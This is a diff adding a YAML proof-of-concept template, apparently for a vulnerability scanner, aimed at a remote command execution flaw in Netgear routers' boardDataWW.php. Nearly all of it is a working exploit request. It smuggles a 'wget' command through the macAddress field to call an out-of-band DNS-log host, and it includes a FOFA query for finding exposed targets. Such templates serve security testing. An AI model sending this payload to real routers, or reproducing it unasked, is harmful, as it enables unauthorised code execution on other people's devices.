@@ -1,0 +1,22 @@
+id: poc-yaml-netgear-boarddataww-rce
+info:
+  name: Netgear路由器boardDataWW.php存在RCE漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  finger: netgear_router
+  fofa: title=="Netgear"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /boardDataWW.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: 'macAddress=112233445566%3Bwget+http%3A%2F%2F{{.reverseDomain}}%23&reginfo=0&writeData=Submit
+
+    '
+  expression: reverse.Verify()
+transport: http
